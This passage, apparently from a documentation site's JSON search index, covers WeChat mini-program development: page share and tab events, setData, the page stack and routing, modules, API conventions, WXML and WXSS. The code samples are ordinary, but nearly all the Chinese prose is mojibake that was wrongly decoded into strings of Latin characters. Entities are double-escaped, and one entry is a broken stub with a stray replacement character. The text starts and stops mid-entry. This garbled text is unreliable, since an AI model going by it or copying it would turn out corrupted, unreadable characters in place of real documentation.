targetï¼šå¦‚æœ from å€¼æ˜¯ buttonï¼Œåˆ™ target æ˜¯è§¦å‘è¿™æ¬¡è½¬å‘äº‹ä»¶çš„ buttonï¼Œå¦åˆ™ä¸º undefined webViewUrlï¼šé¡µé¢ä¸­åŒ…å«ç»„ä»¶æ—¶ï¼Œè¿”å›å½“å‰çš„url   æ­¤äº‹ä»¶éœ€è¦ return ä¸€ä¸ª Objectï¼Œç”¨äºè‡ªå®šä¹‰è½¬å‘å†…å®¹ï¼Œè¿”å›å†…å®¹å¦‚ä¸‹ï¼š  titleï¼šè½¬å‘æ ‡é¢˜ï¼Œé»˜è®¤æ˜¯å½“å‰å°ç¨‹åºåç§°ï¼› pathï¼šè½¬å‘è·¯å¾„ï¼Œé»˜è®¤æ˜¯å½“å‰é¡µé¢ pathã€‚å¿…é¡»æ˜¯ä»¥ / å¼€å¤´çš„å®Œæ•´è·¯å¾„ï¼› imageUrlï¼šè‡ªå®šä¹‰å›¾ç‰‡è·¯å¾„ï¼Œå¯ä»¥æ˜¯æœ¬åœ°æ–‡ä»¶è·¯å¾„ã€ä»£ç åŒ…æ–‡ä»¶è·¯å¾„æˆ–è€…ç½‘ç»œå›¾ç‰‡è·¯å¾„ã€‚æ”¯æŒPNGåŠJPGã€‚æ˜¾ç¤ºå›¾ç‰‡é•¿å®½æ¯”æ˜¯ 5:4ã€‚    ç¤ºä¾‹ä»£ç ï¼š\nPage({  onShareAppMessage(res) {  if (res.from === \u0026#39;button\u0026#39;) {  // æ¥è‡ªé¡µé¢å†…è½¬å‘æŒ‰é’®  console.log(res.target)  }  return {  title: \u0026#39;è‡ªå®šä¹‰è½¬å‘æ ‡é¢˜\u0026#39;,  path: \u0026#39;/page/user?id=123\u0026#39;  }  } })   onResize(object)ï¼šå°ç¨‹åºå±å¹•æ—‹è½¬æ—¶è§¦å‘ã€‚è¯¦è§ å“åº”æ˜¾ç¤ºåŒºåŸŸå˜åŒ–\n  TabItemTap(Object)ï¼šç‚¹å‡» tab æ—¶è§¦å‘ã€‚\nObject å±æ€§ indexã€pagePathã€textã€‚\nPage({  onTabItemTap(item) {  console.log(item.index)  console.log(item.pagePath)  console.log(item.text)  } })   ç»„ä»¶äº‹ä»¶å¤„ç†å‡½æ•° #  Page ä¸­è¿˜å¯ä»¥å®šä¹‰ç»„ä»¶äº‹ä»¶å¤„ç†å‡½æ•°ã€‚åœ¨æ¸²æŸ“å±‚çš„ç»„ä»¶ä¸­åŠ å…¥äº‹ä»¶ç»‘å®šï¼Œå½“äº‹ä»¶è¢«è§¦å‘æ—¶ï¼Œå°±ä¼šæ‰§è¡Œ Page ä¸­å®šä¹‰çš„äº‹ä»¶å¤„ç†å‡½æ•°ã€‚\næ¯”å¦‚åœ¨ wxml å’Œ js ä¸­å†™å…¥ä»¥ä¸‹çš„ä¸¤æ®µä»£ç ï¼š\n\u0026lt;view bindtap=\u0026#34;viewTap\u0026#34;\u0026gt;click me\u0026lt;/view\u0026gt; Page({  viewTap() {  console.log(\u0026#39;view tap\u0026#39;)  } }) è·¯ç”± #  Page.routeï¼šåˆ°å½“å‰é¡µé¢çš„è·¯å¾„ï¼Œç±»å‹ä¸ºStringã€‚\nPage({  onShow() {  console.log(this.route)  } }) setData #  Page.prototype.setData(Object data, Function callback)ï¼šå‡½æ•°ç”¨äºå°†æ•°æ®ä»é€»è¾‘å±‚å‘é€åˆ°è§†å›¾å±‚ï¼ˆå¼‚æ­¥ï¼‰ï¼ŒåŒæ—¶æ”¹å˜å¯¹åº”çš„ this.data çš„å€¼ï¼ˆåŒæ­¥ï¼‰ã€‚\nå‚æ•°è¯´æ˜ï¼š\n   å­—æ®µ ç±»å‹ å¿…å¡« æè¿° æœ€ä½ç‰ˆæœ¬     data Object æ˜¯ è¿™æ¬¡è¦æ”¹å˜çš„æ•°æ®    callback Function å¦ setDataå¼•èµ·çš„ç•Œé¢æ›´æ–°æ¸²æŸ“å®Œæ¯•åçš„å›è°ƒå‡½æ•° 1.5.0    Object ä»¥ key: value çš„å½¢å¼è¡¨ç¤ºï¼Œå°† this.data ä¸­çš„ key å¯¹åº”çš„å€¼æ”¹å˜æˆ valueã€‚\nå…¶ä¸­ key å¯ä»¥ä»¥æ•°æ®è·¯å¾„çš„å½¢å¼ç»™å‡ºï¼Œæ”¯æŒæ”¹å˜æ•°ç»„ä¸­çš„æŸä¸€é¡¹æˆ–å¯¹è±¡çš„æŸä¸ªå±æ€§ï¼Œå¦‚ array[2].messageï¼Œa.b.c.dï¼Œå¹¶ä¸”ä¸éœ€è¦åœ¨ this.data ä¸­é¢„å…ˆå®šä¹‰ã€‚\næ³¨æ„ï¼š\n ç›´æ¥ä¿®æ”¹ this.data è€Œä¸è°ƒç”¨ this.setData æ˜¯æ— æ³•æ”¹å˜é¡µé¢çš„çŠ¶æ€çš„ï¼Œè¿˜ä¼šé€ æˆæ•°æ®ä¸ä¸€è‡´ã€‚ ä»…æ”¯æŒè®¾ç½®å¯ JSON åŒ–çš„æ•°æ®ã€‚ å•æ¬¡è®¾ç½®çš„æ•°æ®ä¸èƒ½è¶…è¿‡1024kBï¼Œè¯·å°½é‡é¿å…ä¸€æ¬¡è®¾ç½®è¿‡å¤šçš„æ•°æ®ã€‚ è¯·ä¸è¦æŠŠ data ä¸­ä»»ä½•ä¸€é¡¹çš„ value è®¾ä¸º undefined ï¼Œå¦åˆ™è¿™ä¸€é¡¹å°†ä¸è¢«è®¾ç½®å¹¶å¯èƒ½é—ç•™ä¸€äº›æ½œåœ¨é—®é¢˜ã€‚  ç¤ºä¾‹ä»£ç ï¼š\n\u0026lt;!--index.wxml--\u0026gt; \u0026lt;view\u0026gt;{{text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeText\u0026#34;\u0026gt;Change normal data\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{num}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeNum\u0026#34;\u0026gt;Change normal num\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{array[0].text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeItemInArray\u0026#34;\u0026gt;Change Array data\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{object.text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;changeItemInObject\u0026#34;\u0026gt;Change Object data\u0026lt;/button\u0026gt; \u0026lt;view\u0026gt;{{newField.text}}\u0026lt;/view\u0026gt; \u0026lt;button bindtap=\u0026#34;addNewField\u0026#34;\u0026gt;Add new data\u0026lt;/button\u0026gt; // index.js Page({  data: {  text: \u0026#39;init data\u0026#39;,  num: 0,  array: [{text: \u0026#39;init data\u0026#39;}],  object: {  text: \u0026#39;init data\u0026#39;  }  },  changeText() {  // this.data.text = \u0026#39;changed data\u0026#39; // ä¸è¦ç›´æ¥ä¿®æ”¹ this.data  // åº”è¯¥ä½¿ç”¨ setData  this.setData({  text: \u0026#39;changed data\u0026#39;  })  },  changeNum() {  // æˆ–è€…ï¼Œå¯ä»¥ä¿®æ”¹ this.data ä¹‹åé©¬ä¸Šç”¨ setData è®¾ç½®ä¸€ä¸‹ä¿®æ”¹äº†çš„å­—æ®µ  this.data.num = 1  this.setData({  num: this.data.num  })  },  changeItemInArray() {  // å¯¹äºå¯¹è±¡æˆ–æ•°ç»„å­—æ®µï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ä¸€ä¸ªå…¶ä¸‹çš„å­å­—æ®µï¼Œè¿™æ ·åšé€šå¸¸æ¯”ä¿®æ”¹æ•´ä¸ªå¯¹è±¡æˆ–æ•°ç»„æ›´å¥½  this.setData({  \u0026#39;array[0].text\u0026#39;: \u0026#39;changed data\u0026#39;  })  },  changeItemInObject() {  this.setData({  \u0026#39;object.text\u0026#39;: \u0026#39;changed data\u0026#39;  })  },  addNewField() {  this.setData({  \u0026#39;newField.text\u0026#39;: \u0026#39;new data\u0026#39;  })  } }) ç”Ÿå‘½å‘¨æœŸ #  ä¸‹å›¾è¡¨ç¤ºäº†ä¸€ä¸ªé¡µé¢çš„å£°æ˜å‘¨æœŸï¼š\n"},{"id":147,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/4.route/","title":"4. Route","section":"3.LogicLayer","content":"é¡µé¢è·¯ç”± #  é¡µé¢æ ˆ #  æ¡†æ¶ä»¥æ ˆçš„å½¢å¼ç»´æŠ¤äº†å½“å‰çš„æ‰€æœ‰é¡µé¢ã€‚ å½“å‘ç”Ÿè·¯ç”±åˆ‡æ¢çš„æ—¶å€™ï¼Œé¡µé¢æ ˆçš„è¡¨ç°å¦‚ä¸‹ï¼š\n   è·¯ç”±æ–¹å¼ é¡µé¢æ ˆè¡¨ç°     åˆå§‹åŒ– æ–°é¡µé¢å…¥æ ˆ   æ‰“å¼€æ–°é¡µé¢ æ–°é¡µé¢å…¥æ ˆ   é¡µé¢é‡å®šå‘ å½“å‰é¡µé¢å‡ºæ ˆï¼Œæ–°é¡µé¢å…¥æ ˆ   é¡µé¢è¿”å› é¡µé¢ä¸æ–­å‡ºæ ˆï¼Œç›´åˆ°ç›®æ ‡è¿”å›é¡µ   Tab åˆ‡æ¢ é¡µé¢å…¨éƒ¨å‡ºæ ˆï¼Œåªç•™ä¸‹æ–°çš„ Tab é¡µé¢   é‡åŠ è½½ é¡µé¢å…¨éƒ¨å‡ºæ ˆï¼Œåªç•™ä¸‹æ–°çš„é¡µé¢    getCurrentPages() #  getCurrentPages() å‡½æ•°ç”¨äºè·å–å½“å‰é¡µé¢æ ˆçš„å®ä¾‹ï¼Œä»¥æ•°ç»„å½¢å¼æŒ‰æ ˆçš„é¡ºåºç»™å‡ºï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºé¦–é¡µï¼Œæœ€åä¸€ä¸ªå…ƒç´ ä¸ºå½“å‰é¡µé¢ã€‚\næ³¨æ„ï¼š\n ä¸è¦å°è¯•ä¿®æ”¹é¡µé¢æ ˆï¼Œä¼šå¯¼è‡´è·¯ç”±ä»¥åŠé¡µé¢çŠ¶æ€é”™è¯¯ã€‚ ä¸è¦åœ¨ App.onLaunch çš„æ—¶å€™è°ƒç”¨ getCurrentPages()ï¼Œæ­¤æ—¶ page è¿˜æ²¡æœ‰ç”Ÿæˆã€‚  è·¯ç”±æ–¹å¼ #  å¯¹äºè·¯ç”±çš„è§¦å‘æ–¹å¼ä»¥åŠé¡µé¢ç”Ÿå‘½å‘¨æœŸå‡½æ•°å¦‚ä¸‹ï¼š\n   è·¯ç”±æ–¹å¼ è§¦å‘æ—¶æœº è·¯ç”±å‰é¡µé¢ è·¯ç”±åé¡µé¢     åˆå§‹åŒ– å°ç¨‹åºæ‰“å¼€çš„ç¬¬ä¸€ä¸ªé¡µé¢  onLoad, onShow   æ‰“å¼€æ–°é¡µé¢ è°ƒç”¨ API wx.navigateTo æˆ–ä½¿ç”¨ç»„ä»¶ `` onHide onLoad, onShow   é¡µé¢é‡å®šå‘ è°ƒç”¨ API wx.redirectTo æˆ–ä½¿ç”¨ç»„ä»¶ `` onUnload onLoad, onShow   é¡µé¢è¿”å› è°ƒç”¨ API wx.navigateBack æˆ–ä½¿ç”¨ç»„ä»¶``æˆ–ç”¨æˆ·æŒ‰å·¦ä¸Šè§’è¿”å›æŒ‰é’® onUnload onShow   Tab åˆ‡æ¢ è°ƒç”¨ API wx.switchTab æˆ–ä½¿ç”¨ç»„ä»¶ `` æˆ–ç”¨æˆ·åˆ‡æ¢ Tab  å„ç§æƒ…å†µè¯·å‚è€ƒä¸‹è¡¨   é‡å¯åŠ¨ è°ƒç”¨ API wx.reLaunch æˆ–ä½¿ç”¨ç»„ä»¶ `` onUnload onLoad, onShow    Tab åˆ‡æ¢å¯¹åº”çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä»¥ Aã€B é¡µé¢ä¸º Tabbar é¡µé¢ï¼ŒC æ˜¯ä» A é¡µé¢æ‰“å¼€çš„é¡µé¢ï¼ŒD é¡µé¢æ˜¯ä» C é¡µé¢æ‰“å¼€çš„é¡µé¢ä¸ºä¾‹ï¼‰ï¼š\n   å½“å‰é¡µé¢ è·¯ç”±åé¡µé¢ è§¦å‘çš„ç”Ÿå‘½å‘¨æœŸï¼ˆæŒ‰é¡ºåºï¼‰     A A Nothing happend   A B A.onHide(), B.onLoad(), B.onShow()   A Bï¼ˆå†æ¬¡æ‰“å¼€ï¼‰ A.onHide(), B.onShow()   C A C.onUnload(), A.onShow()   C B C.onUnload(), B.onLoad(), B.onShow()   D B D.onUnload(), C.onUnload(), B.onLoad(), B.onShow()   Dï¼ˆä»è½¬å‘è¿›å…¥ï¼‰ A D.onUnload(), A.onLoad(), A.onShow()   Dï¼ˆä»è½¬å‘è¿›å…¥ï¼‰ B D.onUnload(), B.onLoad(), B.onShow()    Tips:\n navigateTo, redirectTo åªèƒ½æ‰“å¼€é tabBar é¡µé¢ã€‚ switchTab åªèƒ½æ‰“å¼€ tabBar é¡µé¢ã€‚ reLaunch å¯ä»¥æ‰“å¼€ä»»æ„é¡µé¢ã€‚ é¡µé¢åº•éƒ¨çš„ tabBar ç”±é¡µé¢å†³å®šï¼Œå³åªè¦æ˜¯å®šä¹‰ä¸º tabBar çš„é¡µé¢ï¼Œåº•éƒ¨éƒ½æœ‰ tabBarã€‚ è°ƒç”¨é¡µé¢è·¯ç”±å¸¦çš„å‚æ•°å¯ä»¥åœ¨ç›®æ ‡é¡µé¢çš„onLoadä¸­è·å–ã€‚  "},{"id":148,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/5.modular/","title":"5. Modular","section":"3.LogicLayer","content":"æ¨¡å—åŒ– #  æ–‡ä»¶ä½œç”¨åŸŸ #  åœ¨ JavaScript æ–‡ä»¶ä¸­å£°æ˜çš„å˜é‡å’Œå‡½æ•°åªåœ¨è¯¥æ–‡ä»¶ä¸­æœ‰æ•ˆï¼›ä¸åŒçš„æ–‡ä»¶ä¸­å¯ä»¥å£°æ˜ç›¸åŒåå­—çš„å˜é‡å’Œå‡½æ•°ï¼Œä¸ä¼šäº’ç›¸å½±å“ã€‚\né€šè¿‡å…¨å±€å‡½æ•° getApp() å¯ä»¥è·å–å…¨å±€çš„åº”ç”¨å®ä¾‹ï¼Œå¦‚æœéœ€è¦å…¨å±€çš„æ•°æ®å¯ä»¥åœ¨ App() ä¸­è®¾ç½®ï¼Œå¦‚ï¼š\n// app.js App({  globalData: 1 }) // a.js // The localValue can only be used in file a.js. const localValue = \u0026#39;a\u0026#39; // Get the app instance. const app = getApp() // Get the global data and change it. app.globalData++ // b.js // You can redefine localValue in file b.js, without interference with the localValue in a.js. const localValue = \u0026#39;b\u0026#39; // If a.js it run before b.js, now the globalData shoule be 2. console.log(getApp().globalData) æ¨¡å—åŒ– #  å¯ä»¥å°†ä¸€äº›å…¬å…±çš„ä»£ç æŠ½ç¦»æˆä¸ºä¸€ä¸ªå•ç‹¬çš„ js æ–‡ä»¶ï¼Œä½œä¸ºä¸€ä¸ªæ¨¡å—ã€‚æ¨¡å—åªæœ‰é€šè¿‡ module.exports æˆ–è€… exports æ‰èƒ½å¯¹å¤–æš´éœ²æ¥å£ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼š\n exports æ˜¯ module.exports çš„ä¸€ä¸ªå¼•ç”¨ï¼Œå› æ­¤åœ¨æ¨¡å—é‡Œè¾¹éšæ„æ›´æ”¹ exports çš„æŒ‡å‘ä¼šé€ æˆæœªçŸ¥çš„é”™è¯¯ã€‚æ‰€ä»¥æ›´æ¨èå¼€å‘è€…é‡‡ç”¨ module.exports æ¥æš´éœ²æ¨¡å—æ¥å£ï¼Œé™¤éä½ å·²ç»æ¸…æ™°çŸ¥é“è¿™ä¸¤è€…çš„å…³ç³»ã€‚ å°ç¨‹åºç›®å‰ä¸æ”¯æŒç›´æ¥å¼•å…¥ node_modules , å¼€å‘è€…éœ€è¦ä½¿ç”¨åˆ° node_modules æ—¶å€™å»ºè®®æ‹·è´å‡ºç›¸å…³çš„ä»£ç åˆ°å°ç¨‹åºçš„ç›®å½•ä¸­æˆ–è€…ä½¿ç”¨å°ç¨‹åºæ”¯æŒçš„ npm åŠŸèƒ½ã€‚  // common.js function sayHello(name) {  console.log(`Hello ${name}!`) } function sayGoodbye(name) {  console.log(`Goodbye ${name}!`) }  module.exports.sayHello = sayHello exports.sayGoodbye = sayGoodbye åœ¨éœ€è¦ä½¿ç”¨è¿™äº›æ¨¡å—çš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ require(path) å°†å…¬å…±ä»£ç å¼•å…¥\nconst common = require(\u0026#39;common.js\u0026#39;) Page({  helloMINA() {  common.sayHello(\u0026#39;MINA\u0026#39;)  },  goodbyeMINA() {  common.sayGoodbye(\u0026#39;MINA\u0026#39;)  } }) NOTICE: require æš‚æ—¶ä¸æ”¯æŒç»å¯¹è·¯å¾„\n"},{"id":149,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/6.api/","title":"6. API","section":"3.LogicLayer","content":"API #  å°ç¨‹åºå¼€å‘æ¡†æ¶æä¾›ä¸°å¯Œçš„å¾®ä¿¡åŸç”Ÿ APIï¼Œå¯ä»¥æ–¹ä¾¿çš„è°ƒèµ·å¾®ä¿¡æä¾›çš„èƒ½åŠ›ï¼Œå¦‚è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œæœ¬åœ°å­˜å‚¨ï¼Œæ”¯ä»˜åŠŸèƒ½ç­‰ã€‚è¯¦ç»†ä»‹ç»è¯·å‚è€ƒ API æ–‡æ¡£ã€‚\näº‹ä»¶ç›‘å¬ API #  æˆ‘ä»¬çº¦å®šï¼Œä»¥ on å¼€å¤´çš„ API ç”¨æ¥ç›‘å¬æŸä¸ªäº‹ä»¶æ˜¯å¦è§¦å‘ï¼Œå¦‚ï¼šwx.onSocketOpenï¼Œwx.onCompassChange ç­‰ã€‚\nè¿™ç±» API æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå½“äº‹ä»¶è§¦å‘æ—¶ä¼šè°ƒç”¨è¿™ä¸ªå›è°ƒå‡½æ•°ï¼Œå¹¶å°†ç›¸å…³æ•°æ®ä»¥å‚æ•°å½¢å¼ä¼ å…¥ã€‚\nä¾‹å¦‚ï¼š\nwx.onCompassChange(function (res) {  console.log(res.direction) }) åŒæ­¥ API #  æˆ‘ä»¬çº¦å®šï¼Œä»¥ Sync ç»“å°¾çš„ API éƒ½æ˜¯åŒæ­¥ APIï¼Œ å¦‚ wx.setStorageSyncï¼Œwx.getSystemInfoSync ç­‰ã€‚æ­¤å¤–ï¼Œä¹Ÿæœ‰ä¸€äº›å…¶ä»–çš„åŒæ­¥ APIï¼Œå¦‚ wx.createWorkerï¼Œwx.getBackgroundAudioManager ç­‰ï¼Œè¯¦æƒ…å‚è§ API æ–‡æ¡£ä¸­çš„è¯´æ˜ã€‚\nåŒæ­¥ API çš„æ‰§è¡Œç»“æœå¯ä»¥é€šè¿‡å‡½æ•°è¿”å›å€¼ç›´æ¥è·å–ï¼Œå¦‚æœæ‰§è¡Œå‡ºé”™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚\ntry {  wx.setStorageSync(\u0026#39;key\u0026#39;, \u0026#39;value\u0026#39;) } catch (e) {  console.error(e) } å¼‚æ­¥ API #  å¤§å¤šæ•° API éƒ½æ˜¯å¼‚æ­¥ APIï¼Œå¦‚ wx.requestï¼Œwx.login ç­‰ã€‚è¿™ç±» API æ¥å£é€šå¸¸éƒ½æ¥å—ä¸€ä¸ª Object ç±»å‹çš„å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°éƒ½æ”¯æŒæŒ‰éœ€æŒ‡å®šä»¥ä¸‹å­—æ®µæ¥æ¥æ”¶æ¥å£è°ƒç”¨ç»“æœï¼š\nObject å‚æ•°è¯´æ˜ï¼š\n   å‚æ•°å ç±»å‹ å¿…å¡« è¯´æ˜     success function å¦ æ¥å£è°ƒç”¨æˆåŠŸçš„å›è°ƒå‡½æ•°   fail function å¦ æ¥å£è°ƒç”¨å¤±è´¥çš„å›è°ƒå‡½æ•°   complete function å¦ æ¥å£è°ƒç”¨ç»“æŸçš„å›è°ƒå‡½æ•°ï¼ˆè°ƒç”¨æˆåŠŸã€å¤±è´¥éƒ½ä¼šæ‰§è¡Œï¼‰   å…¶ä»– Any - æ¥å£å®šä¹‰çš„å…¶ä»–å‚æ•°    å›è°ƒå‡½æ•°çš„å‚æ•°ï¼š\nsuccessï¼Œfailï¼Œcomplete å‡½æ•°è°ƒç”¨æ—¶ä¼šä¼ å…¥ä¸€ä¸ª Object ç±»å‹å‚æ•°ï¼ŒåŒ…å«ä»¥ä¸‹å­—æ®µï¼š\n   å±æ€§ ç±»å‹ è¯´æ˜     errMsg string é”™è¯¯ä¿¡æ¯ï¼Œå¦‚æœè°ƒç”¨æˆåŠŸè¿”å› ${apiName}:ok   errCode number é”™è¯¯ç ï¼Œä»…éƒ¨åˆ† API æ”¯æŒï¼Œå…·ä½“å«ä¹‰è¯·å‚è€ƒå¯¹åº” API æ–‡æ¡£ï¼ŒæˆåŠŸæ—¶ä¸º 0ã€‚   å…¶ä»– Any æ¥å£è¿”å›çš„å…¶ä»–æ•°æ®    å¼‚æ­¥ API çš„æ‰§è¡Œç»“æœéœ€è¦é€šè¿‡ Object ç±»å‹çš„å‚æ•°ä¸­ä¼ å…¥çš„å¯¹åº”å›è°ƒå‡½æ•°è·å–ã€‚éƒ¨åˆ†å¼‚æ­¥ API ä¹Ÿä¼šæœ‰è¿”å›å€¼ï¼Œå¯ä»¥ç”¨æ¥å®ç°æ›´ä¸°å¯Œçš„åŠŸèƒ½ï¼Œå¦‚ wx.requestï¼Œwx.connectSockets ç­‰ã€‚\nä¾‹å¦‚ï¼š\nwx.login({  success(res) {  console.log(res.code)  } }) "},{"id":150,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/1.wxml/","title":"1. Wxml","section":"4.ViewLayer","content":"ï¿½\nå‡º bug äº†ï¼šhttps://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/\nWXML #  æ•°æ®ç»‘å®š #  åˆ—è¡¨æ¸²æŸ“ #  æ¡ä»¶æ¸²æŸ“ #  æ¨¡æ¿ #  äº‹ä»¶ #  å¼•ç”¨ #  import #  import æœ‰ä½œç”¨åŸŸçš„æ¦‚å¿µï¼Œå³åªä¼š import ç›®æ ‡æ–‡ä»¶ä¸­å®šä¹‰çš„ templateï¼Œè€Œä¸ä¼š import ç›®æ ‡æ–‡ä»¶ import çš„ templateã€‚\ninclude #  include å¯ä»¥å°†ç›®æ ‡æ–‡ä»¶é™¤äº† \u0026lt;template/\u0026gt; \u0026lt;wxs/\u0026gt; å¤–çš„æ•´ä¸ªä»£ç å¼•å…¥ï¼Œç›¸å½“äºæ˜¯æ‹·è´åˆ° include ä½ç½®ï¼Œå¦‚ï¼š\n"},{"id":151,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/2.wxss/","title":"2. Wxss","section":"4.ViewLayer","content":"WXSS #  WXSS(WeiXin Style Sheets)æ˜¯ä¸€å¥—æ ·å¼è¯­è¨€ï¼Œç”¨äºæè¿° WXML çš„ç»„ä»¶æ ·å¼ã€‚\nWXSS ç”¨æ¥å†³å®š WXML çš„ç»„ä»¶åº”è¯¥æ€ä¹ˆæ˜¾ç¤ºã€‚\nä¸ºäº†é€‚åº”å¹¿å¤§çš„å‰ç«¯å¼€å‘è€…ï¼ŒWXSS å…·æœ‰ CSS å¤§éƒ¨åˆ†ç‰¹æ€§ã€‚åŒæ—¶ä¸ºäº†æ›´é€‚åˆå¼€å‘å¾®ä¿¡å°ç¨‹åºï¼ŒWXSS å¯¹ CSS è¿›è¡Œäº†æ‰©å……ä»¥åŠä¿®æ”¹ã€‚\nä¸ CSS ç›¸æ¯”ï¼ŒWXSS æ‰©å±•çš„ç‰¹æ€§æœ‰ï¼š\n å°ºå¯¸å•ä½ æ ·å¼å¯¼å…¥  å°ºå¯¸å•ä½ #   rpxï¼ˆresponsive pixelï¼‰: å¯ä»¥æ ¹æ®å±å¹•å®½åº¦è¿›è¡Œè‡ªé€‚åº”ã€‚è§„å®šå±å¹•å®½ä¸º750rpxã€‚å¦‚åœ¨ iPhone6 ä¸Šï¼Œå±å¹•å®½åº¦ä¸º375pxï¼Œå…±æœ‰750ä¸ªç‰©ç†åƒç´ ï¼Œåˆ™750rpx = 375px = 750ç‰©ç†åƒç´ ï¼Œ1rpx = 0.5px = 1ç‰©ç†åƒç´ ã€‚     è®¾å¤‡ rpxæ¢ç®—px (å±å¹•å®½åº¦/750) pxæ¢ç®—rpx (750/å±å¹•å®½åº¦)     iPhone5 1rpx = 0.42px 1px = 2.34rpx   iPhone6 1rpx = 0.5px 1px = 2rpx   iPhone6 Plus 1rpx = 0.552px 1px = 1.81rpx    å»ºè®®ï¼š å¼€å‘å¾®ä¿¡å°ç¨‹åºæ—¶è®¾è®¡å¸ˆå¯ä»¥ç”¨ iPhone6 ä½œä¸ºè§†è§‰ç¨¿çš„æ ‡å‡†ã€‚\næ³¨æ„ï¼š åœ¨è¾ƒå°çš„å±å¹•ä¸Šä¸å¯é¿å…çš„ä¼šæœ‰ä¸€äº›æ¯›åˆºï¼Œè¯·åœ¨å¼€å‘æ—¶å°½é‡é¿å…è¿™ç§æƒ…å†µã€‚\næ ·å¼å¯¼å…¥ #  ä½¿ç”¨ @import è¯­å¥å¯ä»¥å¯¼å…¥å¤–è”æ ·å¼è¡¨ï¼Œ@import åè·Ÿéœ€è¦å¯¼å…¥çš„å¤–è”æ ·å¼è¡¨çš„ç›¸å¯¹è·¯å¾„ï¼Œç”¨;è¡¨ç¤ºè¯­å¥ç»“æŸã€‚\nç¤ºä¾‹ä»£ç ï¼š\n/** common.wxss **/ .small-p {  padding:5px; } /** app.wxss **/ @import \u0026#34;common.wxss\u0026#34;; .middle-p {  padding:15px; } å†…è”æ ·å¼ #  æ¡†æ¶ç»„ä»¶ä¸Šæ”¯æŒä½¿ç”¨ styleã€class å±æ€§æ¥æ§åˆ¶ç»„ä»¶çš„æ ·å¼ã€‚\n  styleï¼šé™æ€çš„æ ·å¼ç»Ÿä¸€å†™åˆ° class ä¸­ã€‚style æ¥æ”¶åŠ¨æ€çš„æ ·å¼ï¼Œåœ¨è¿è¡Œæ—¶ä¼šè¿›è¡Œè§£æï¼Œè¯·å°½é‡é¿å…å°†é™æ€çš„æ ·å¼å†™è¿› style ä¸­ï¼Œä»¥å…å½±å“æ¸²æŸ“é€Ÿåº¦ã€‚\n\u0026lt;view style=\u0026#34;color:{{color}};\u0026#34; /\u0026gt;   classï¼šç”¨äºæŒ‡å®šæ ·å¼è§„åˆ™ï¼Œå…¶å±æ€§å€¼æ˜¯æ ·å¼è§„åˆ™ä¸­ç±»é€‰æ‹©å™¨å(æ ·å¼ç±»å)çš„é›†åˆï¼Œæ ·å¼ç±»åä¸éœ€è¦å¸¦ä¸Š.ï¼Œæ ·å¼ç±»åä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚\n\u0026lt;view class=\u0026#34;normal_view\u0026#34; /\u0026gt;   é€‰æ‹©å™¨ #  ç›®å‰æ”¯æŒçš„é€‰æ‹©å™¨æœ‰ï¼š\n   é€‰æ‹©å™¨ æ ·ä¾‹ æ ·ä¾‹æè¿°     .class .intro é€‰æ‹©æ‰€æœ‰æ‹¥æœ‰ class=\u0026ldquo;intro\u0026rdquo; çš„ç»„ä»¶   #id #firstname é€‰æ‹©æ‹¥æœ‰ id=\u0026ldquo;firstname\u0026rdquo; çš„ç»„ä»¶   element view é€‰æ‹©æ‰€æœ‰ view ç»„ä»¶   element, element view, checkbox é€‰æ‹©æ‰€æœ‰æ–‡æ¡£çš„ view ç»„ä»¶å’Œæ‰€æœ‰çš„ checkbox ç»„ä»¶   ::after view::after åœ¨ view ç»„ä»¶åè¾¹æ’å…¥å†…å®¹   ::before view::before åœ¨ view ç»„ä»¶å‰è¾¹æ’å…¥å†…å®¹    å…¨å±€æ ·å¼ä¸å±€éƒ¨æ ·å¼ #  å®šä¹‰åœ¨ app.wxss ä¸­çš„æ ·å¼ä¸ºå…¨å±€æ ·å¼ï¼Œä½œç”¨äºæ¯ä¸€ä¸ªé¡µé¢ã€‚åœ¨ page çš„ wxss æ–‡ä»¶ä¸­å®šä¹‰çš„æ ·å¼ä¸ºå±€éƒ¨æ ·å¼ï¼Œåªä½œç”¨åœ¨å¯¹åº”çš„é¡µé¢ï¼Œå¹¶ä¼šè¦†ç›– app.wxss ä¸­ç›¸åŒçš„é€‰æ‹©å™¨ã€‚\n"},{"id":152,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/3.component/","title":"3. Component","section":"4.ViewLayer","content":"åŸºç¡€ç»„ä»¶ #  